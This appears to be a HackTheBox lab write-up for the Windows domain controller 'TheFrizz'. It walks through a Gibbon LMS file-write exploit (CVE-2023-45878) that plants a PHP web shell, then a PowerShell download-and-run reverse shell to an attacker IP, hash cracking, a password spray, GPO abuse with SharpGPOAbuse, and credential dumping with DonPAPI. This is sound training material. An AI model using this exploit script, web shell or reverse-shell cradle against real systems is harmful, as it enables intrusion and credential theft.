---
title:  "TheFrizz (Medium)"
seo_title: "Writeup for the HackTheBox TheFrizz Machine"
date:   2025-08-23T17:00
categories: ['HackTheBox', 'Windows', 'Active-Directory']
---

![](/assets/images/headers/thefrizz.png)

# Synopsis

`TheFrizz` is a medium-difficulty Windows machine featuring a web application showcasing Walkerville Elementary School and a Gibbon CMS instance. The Gibbon-LMS instance is susceptible to unauthenticated arbitrary file write (CVE-2023-45878), which is used to write a PHP shell to the web application and gain access to the target. After gaining access to the system, a database settings file containing credentials to access MySQL includes a hash and salt for the user f.frizzle that can be cracked. After cracking the password, we authenticate to the target using SSH with GSSAPI/Kerberos. We request a TGT, which is then used to authenticate via Kerberos authentication. A deleted 7Zip archive is discovered in the `fiona` user's recycling bin which is extracted revealing a WAPT setup and includes a configuration file with base64-encoded credentials used to authenticate as the `M.Schoolbus` user. `M.Schoolbus` is a member of the `Group Policy Creator Owners`, which allows them to create GPOs within the domain, which is leveraged to escalate privileges to `NT Authority\System`.

## Enumeration

Our Nmap scan shows a Domain Controller with hostname `frizzdc.frizz.htb` hosting a web application on port 80.
```console
$ nmap 10.129.26.253 -sCV -v -oN thefrizz.nmap 
Nmap scan report for 10.129.26.253
Host is up (0.030s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-16 02:56:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-16T02:56:39
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

After navigating the site, we can navigate to the staff login at `http://frizzdc.frizz.htb/Gibbon-LMS/`. 

![](/assets/images/writeups/thefrizz/staff-login.png)

In the footer, we see the site is `Powered by Gibbon v25.0.00` and find a welcome message at the top.

![](/assets/images/writeups/thefrizz/staff-login2.png)

We have a potential user (Fiona Frizzle) that we can expect on the target machine. We can Google for available exploits that target this specific version. There are several vulnerabilities in version 26.0.00 and below like an LFI in the query parameter (CVE-2023-34598) and an authenticated RCE ([CVE-2024-24725](hhttps://www.exploit-db.com/exploits/51903)). However, we don't have any credentials yet, so we start looking further.

On [Vulmon](https://vulmon.com/searchpage?q=Gibbonedu%20Gibbon), we can find a critical vulnerability in GibbonEdu allowing arbitrary file write (CVE-2023-45878) in the *Rubrics* module.

![](/assets/images/writeups/thefrizz/gibbon-exploit-research.png)

The description and PoC on [HeroLab](https://herolab.usd.de/security-advisories/usd-2023-0025/) explains that this module has a file called `rubrics_visualise_saveAjax.php` which can be accessed without authentication. Therefore, we first verify if we can access this file.

![](/assets/images/writeups/thefrizz/rubrics-module.png)

## Foothold
We verified that the script is indeed active on our instance. Reading the article, it explains that the file accepts the `img`, `path` and `gibbonPersonID` as POST parameters. If the `path` parameter is set, the defined path is used as the destination folder, concatinated with the absolute path of the Gibbon installation directory. We can create a small exploit script that writes a PHP file in the installation directory.

```python
import requests
import base64

# config options
gibbon_root = "http://frizzdc.frizz.htb/Gibbon-LMS/"
path = "asdf.php"
payload = "<?php echo system($_GET['cmd']);?>"

url = f"{gibbon_root}/modules/Rubrics/rubrics_visualise_saveAjax.php"
target_file = f"{gibbon_root.rsplit('/', 1)[0]}/{path}"
encoded_payload = base64.b64encode(payload.encode()).decode()

data = {
  "img" : f"image/png;asdf,{encoded_payload}",
  "path": path,
  "gibbonPersonID": "0000000001"
}

response = requests.post(url,data=data)

if response.status_code == 200:
  print(f"[+] Payload sent successfully to {url}")
  if requests.get(target_file).status_code == 200:
  	print(f"[+] File accessible at {target_file}")
  	print(f"[+] Checking current user: {requests.get(f'{target_file}?cmd=whoami').text}")
  else:
  	print(f"[-] Could not access file at {target_file}")
else:
  print(f"[!] Failed to send payload. Status code: {response.status_code}")
```

After running our exploit script we can access our webshell.

```console
$ python exploit.py
[+] Payload sent successfully to http://frizzdc.frizz.htb/Gibbon-LMS//modules/Rubrics/rubrics_visualise_saveAjax.php
[+] File accessible at http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php
[+] Checking current user: frizz\w.webservice
```

Next we can try to get a shell on the machine. We can generate a Powershell reverse shell cradle as follows:

```console
$ cat shell.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.29',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$ echo "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.16.29:8888/shell.ps1')" > cradle
$ cat cradle | iconv -t utf-16le | base64 -w 0; echo

$ python3 -m http.server 8888
$ sudo nc -nvlp 443
$ curl 'http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php?cmd=cmd+/c+powershell+-enc+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADkAOgA4ADgAOAA4AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA'
```

After running our Python server and Netcat listener, we can launch our command to get a shell as `frizz\w.webservice`.

![](/assets/images/writeups/thefrizz/foothold-shell.png)

## User
After having a shell on the box, we proceed to do further host enumeration. I looked for interesting files in the current directory and looking for patterns that matched the keywords "password", "database" or "htb".

```console
PS C:\xampp\htdocs\Gibbon-LMS> Get-ChildItem -File -Recurse -Depth 1 | Where-Object{$_.FullName -match 'config|database|setting'} | Select-String -Pattern "(?i)password|database|htb" | Select Filename,Line | Where-Object { $_.Line -notmatch "^\s*[#*/]" }

Filename   Line
--------   ----
config.php $databaseServer = 'localhost';
config.php $databaseUsername = 'MrGibbonsDB';
config.php $databasePassword = 'MisterGibbs!Parrot!?1';
config.php $databaseName = 'gibbon';
```

After running this command it finds a `config.php` that contains the password of the Gibbon database. Next we can run `mysql` to extract data from the database. Note that we have to be in the current directory to execute the binary.

```console
PS C:\xampp\mysql\bin\> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon;DESCRIBE gibbonperson;"
<SNIP>
nameInCharacters        varchar(60)     NO              NULL
gender  enum('M','F','Other','Unspecified')     NO              Unspecified
username        varchar(20)     NO      UNI     NULL
passwordStrong  varchar(255)    NO              NULL
passwordStrongSalt      varchar(255)    NO              NULL
passwordForceReset      enum('N','Y')   NO              N
<SNIP>

PS C:\xampp\mysql\bin\> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon;SELECT username,passwordStrong,passwordStrongSalt from gibbonperson;"
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```

Inside the database we can find a password hash and salt for `f.frizzle`. We can conver the hash into the right format and crack it with Hashcat.

```console
$ hashcat '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489' $ROCKYOU -m 1420

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```

We were able to crack the password of Fiona Frizzle. The password allows us to login to the Gibbon backend.

![](/assets/images/writeups/thefrizz/gibbon-backend.png)

On the message wall, Fiona is talking about a desktop management tool called WAPT so we can keep that in the back of our head. For now we can try to login using SMB or WinRM.

```console
$ nxc smb frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
SMB         10.129.48.142   445    10.129.48.142    [*]  x64 (name:10.129.48.142) (domain:10.129.48.142) (signing:True) (SMBv1:False)
SMB         10.129.48.142   445    10.129.48.142    [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
```

However, we get a `STATUS_NOT_SUPPORTED` error. Lets try to get a TGT and try again with Kerberos.

```console
$ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We can easily fix the clock skew with `faketime`:

```console
$ faketime "$(ntpdate -q frizz.htb | cut -d ' ' -f 1,2)" bash
$ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
$ nxc smb frizz.htb -k -d frizz.htb --use-kcache
SMB         frizz.htb       445    frizz            [*]  x64 (name:frizz) (domain:htb) (signing:True) (SMBv1:False)
SMB         frizz.htb       445    frizz            [-] frizz.htb\ from ccache STATUS_MORE_PROCESSING_REQUIRED
```

I still got errors, so I tried using SSH since this port is open. First make sure that the `/etc/krb5.conf` looks as follows:

```
[libdefault]
        default_realm = FRIZZDC.FRIZZ.HTB
        dns_lookup_realm = false
        dns_lookup_kdc = true
        ticket_lifetime = 24h
        forwardable = true

[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
        }

[domain_realm]
        frizz.htb = FRIZZ.HTB
        .frizz.htb = FRIZZ.HTB
```

Next we can connect.

```console
$ KRB5CCNAME=f.frizzle.ccache ssh f.frizzle@frizz.htb
PS C:\Users\f.frizzle> cat Desktop\user.txt
```

Alternatively, we can also use EvilWinRM.

```console
$ KRB5CCNAME=f.frizzle.ccache evil-winrm -i frizzdc.frizz.htb -r FRIZZ.HTB
*Evil-WinRM* PS C:\Users\f.frizzle\Documents>
```

## Root
First we can try running SharpHound and import our data into BloodHound CE but there is not something that jumps out. For the next part I was stuck for a while enumerating every single directory. Eventually I stumbled upon a file in the recycle bin:

```console
PS C:\Users\f.frizzle> cmd /c cmd.exe
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

frizz\f.frizzle@FRIZZDC C:\Users\f.frizzle> cd C:\$Recycle.Bin
frizz\f.frizzle@FRIZZDC C:\$RECYCLE.BIN> dir /a

10/29/2024  07:31 AM    <DIR>          .
03/10/2025  03:39 PM    <DIR>          ..
10/29/2024  07:31 AM    <DIR>          S-1-5-21-2386970044-1145388522-2932701813-1103

frizz\f.frizzle@FRIZZDC C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> dir

10/29/2024  07:31 AM               148 $IE2XMEG.7z
10/24/2024  09:16 PM        30,416,987 $RE2XMEG.7z
```

Here we find two files. I downloaded them to my local machine and found that one of the contains the source code for WAPT that Fiona was talking about.

```console
$ KRB5CCNAME=f.frizzle.ccache scp 'f.frizzle@frizz.htb:C:\\$Recycle.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\\$RE2XMEG.7z' R.7z

$ 7z x R.7z
$ cat wapt/conf/waptserver.ini

[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

The `waptserver.ini` contains a Base64 encoded password. We decode it and peform a password spray on the accounts.

```console
PS C:\Users\f.frizzle> get-aduser -filter * | ft -property name

name
----
Administrator
Guest
krbtgt
f.frizzle
w.li
h.arm
M.SchoolBus
d.hudson
k.franklin
l.awesome
t.wright
r.tennelli
J.perlstein
a.perlstein
p.terese
v.frizzle
g.frizzle
c.sandiego
c.ramon
m.ramon
w.Webservice

$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
!suBcig@MehTed!R

$ while read u; do getTGT.py frizz.htb/$u:'!suBcig@MehTed!R' | grep ticket; done < users.txt
[*] Saving ticket in M.SchoolBus.ccache
```

We were able to get the TGT of `M.SchoolBus`.

```console
$ KRB5CCNAME=M.SchoolBus.ccache ssh M.SchoolBus@frizz.htb
PS C:\Users\M.SchoolBus>
```

After not finding much on BloodHound, I started to proceed my enumeration with PowerView. First copy `PowerView.ps1` to the machine with scp and execute `powershell.exe` to be able to import the script.

```console
$ KRB5CCNAME=M.SchoolBus.ccache scp PowerView.ps1 M.SchoolBus@frizz.htb:C:\\Users\\M.SchoolBus

PS C:\Users\M.SchoolBus> powershell.exe
PS C:\Users\M.SchoolBus> . .\PowerView.ps1
```

### GPO Abuse
One topic that I learned recently is GPO abuse so I started to look if this account was able to link GPOs to the domain. Next I also looked at if there are users that can link GPOs to OUs.

```console
PS C:\Users\M.SchoolBus> Get-DomainObjectAcl -SearchScope Base -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List

ObjectDN    : DC=frizz,DC=htb
ResolvedSID : frizz\M.SchoolBus

PS C:\Users\M.SchoolBus> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List

ObjectDN    : OU=Domain Controllers,DC=frizz,DC=htb
ResolvedSID : frizz\M.SchoolBus

ObjectDN    : OU=Class_Frizz,DC=frizz,DC=htb
ResolvedSID : frizz\M.SchoolBus
```

We see that `M.SchoolBus` can link to the domain and both the `Domain Controllers` and `Class_Frizz` OUs. With these permissions we can elevate our privileges and add our account to the local administrators group.

First we create a new GPO.

```console
PS C:\Users\M.SchoolBus> New-GPO -Name "NewGPO" -Comment "This is a test GPO"

DisplayName      : NewGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 42a6ef68-b465-4886-9872-eee1e3787879
GpoStatus        : AllSettingsEnabled
Description      : This is a test GPO
CreationTime     : 3/16/2025 5:16:29 PM
ModificationTime : 3/16/2025 5:16:29 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Next we can link this GPO to a target OU, in this case the `Domain Controllers` OU.

```console
PS C:\Users\M.SchoolBus> New-GPLink -Name "NewGPO" -Target "OU=Domain Controllers,DC=FRIZZ,DC=HTB"

GpoId       : ccb9eb1b-ed08-4efc-89da-e65c2bcf6599
DisplayName : NewGPO
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
```

Next we can run `SharpGPOAbuse.exe` to create a new local admin account.

```console
PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName NewGPO
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "NewGPO" is: {CCB9EB1B-ED08-4EFC-89DA-E65C2BCF6599}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{CCB9EB1B-ED08-4EFC-89DA-E65C2BCF6599}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!

PS C:\Users\M.SchoolBus> gpupdate /force

Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

PS C:\Users\M.SchoolBus> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
M.SchoolBus
The command completed successfully.
```

In another session we can read the root flag.

```console
PS C:\Users\Administrator\Desktop> type root.txt
```

### Dumping Creds
Next we dump all the credentials with DonPAPI.

```console
$ KRB5CCNAME=M.SchoolBus.ccache donpapi collect -k --no-pass -t frizzdc.frizz.htb
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/s3rp3nt/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/s3rp3nt/.donpapi/recover/recover_1742171384
[frizzdc.frizz.htb] [+] Starting gathering credz
[frizzdc.frizz.htb] [+] Dumping SAM
[01:29:52] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.       secretsdump.py:1340
[frizzdc.frizz.htb] [$] [SAM] Got 3 accounts
[frizzdc.frizz.htb] [+] Dumping LSA
[frizzdc.frizz.htb] [$] [LSA] (Unknown User):BananaB0at!!@
[frizzdc.frizz.htb] [$] [LSA] (Unknown User):BananaB0at!!@
[frizzdc.frizz.htb] [+] Dumping User and Machine masterkeys
[frizzdc.frizz.htb] [$] [DPAPI] Got 5 masterkeys
[frizzdc.frizz.htb] [+] Dumping User Chromium Browsers
[frizzdc.frizz.htb] [+] Dumping User and Machine Certificates
[frizzdc.frizz.htb] [+] Dumping User and Machine Credential Manager
[frizzdc.frizz.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{021CAB75-2E8A-43B7-A27B-3E488E46505D} - frizz\v.frizzle:Remember0?Attempt?Depend?Was?Tape
[frizzdc.frizz.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{C810CEE4-32F3-42A9-BDEF-16ADE0E28272} - frizz\f.frizzle:Jenni_Luvs_Magic23
[frizzdc.frizz.htb] [+] Gathering recent files and desktop files
[frizzdc.frizz.htb] [+] Dumping User Firefox Browser
[frizzdc.frizz.htb] [+] Dumping MobaXterm credentials
[frizzdc.frizz.htb] [+] Dumping MRemoteNg Passwords
[frizzdc.frizz.htb] [+] Dumping User's RDCManager
[frizzdc.frizz.htb] [+] Dumping SCCM Credentials
[frizzdc.frizz.htb] [+] Dumping User and Machine Vaults
[frizzdc.frizz.htb] [+] Dumping VNC Credentials
[frizzdc.frizz.htb] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```